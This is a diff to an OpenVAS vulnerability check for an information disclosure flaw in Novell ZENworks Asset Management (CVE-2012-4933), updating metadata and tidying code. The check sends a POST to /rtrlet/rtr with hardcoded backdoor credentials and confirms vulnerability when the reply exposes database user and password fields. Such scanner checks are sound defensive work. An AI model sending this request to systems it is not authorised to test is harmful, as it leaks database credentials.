@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_novell_zenworks_asset_mangment_info_disc_vuln.nasl 5856 2017-04-04 12:59:37Z cfi $
+# $Id: secpod_novell_zenworks_asset_mangment_info_disc_vuln.nasl 10021 2018-05-30 09:03:08Z cfischer $
 #
 # Novell ZENWorks Asset Management Information Disclosure Vulnerabilities
 #
@@ -27,19 +27,18 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902928");
-  script_version("$Revision: 5856 $");
+  script_version("$Revision: 10021 $");
   script_cve_id("CVE-2012-4933");
   script_bugtraq_id(55933);
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-04 14:59:37 +0200 (Tue, 04 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-30 11:03:08 +0200 (Wed, 30 May 2018) $");
   script_tag(name:"creation_date", value:"2012-10-26 12:25:31 +0530 (Fri, 26 Oct 2012)");
   script_name("Novell ZENWorks Asset Management Information Disclosure Vulnerabilities");
   script_xref(name : "URL" , value : "http://secunia.com/advisories/50967/");
   script_xref(name : "URL" , value : "http://securitytracker.com/id?1027682");
   script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/332412");
   script_xref(name : "URL" , value : "https://community.rapid7.com/community/metasploit/blog/2012/10/15/cve-2012-4933-novell-zenworks");
-
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2012 SecPod");
   script_family("Web application abuses");
@@ -58,16 +57,13 @@ if(description)
   exploited to gain access to the configuration file and download arbitrary
   files by specifying an absolute path.");
   script_tag(name : "solution" , value : "Apply the patch from the below link or update to latest version,
-  For patch refer to http://download.novell.com/Download?buildid=yse-osBjxeo~
-  For updates refer to http://www.novell.com/products/zenworks/assetmanagement
 
-  *****
-  NOTE: Ignore this warning if above mentioned patch is installed.
-  *****");
+  For patch refer to http://download.novell.com/Download?buildid=yse-osBjxeo~
+
+  For updates refer to http://www.novell.com/products/zenworks/assetmanagement");
   script_tag(name : "summary" , value : "This host is running Novell ZENWorks Asset Management and is
   prone to information disclosure vulnerabilities.");
   script_tag(name:"solution_type", value:"VendorFix");
-
   script_tag(name:"qod_type", value:"remote_app");
 
   exit(0);
@@ -76,36 +72,24 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initiliazation
-port = "";
-host = "";
-req = "";
-res = "";
-
 port = get_http_port( default:8080 );
-
 host = http_host_name( port:port );
 
-## Construct the POST data
 data = "kb=&file=&absolute=&maintenance=GetConfigInfo_password&username" +
        "=Ivanhoe&password=Scott&send=Submit";
 
-## Construct the POST request
 req = string("POST /rtrlet/rtr HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(data), "\r\n\r\n",
              data);
-
-## Send constructed POST request and collect the response
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Confirm that configure file contents is received
 if(res && "Rtrlet Servlet Configuration Parameters" >< res &&
    "DBName" >< res && "DBUser" >< res && "ZENWorks" >< res &&
    "DBPassword" >< res){
- security_message(port:port);
- exit(0);
+  security_message(port:port);
+  exit(0);
 }
 
 exit(99);
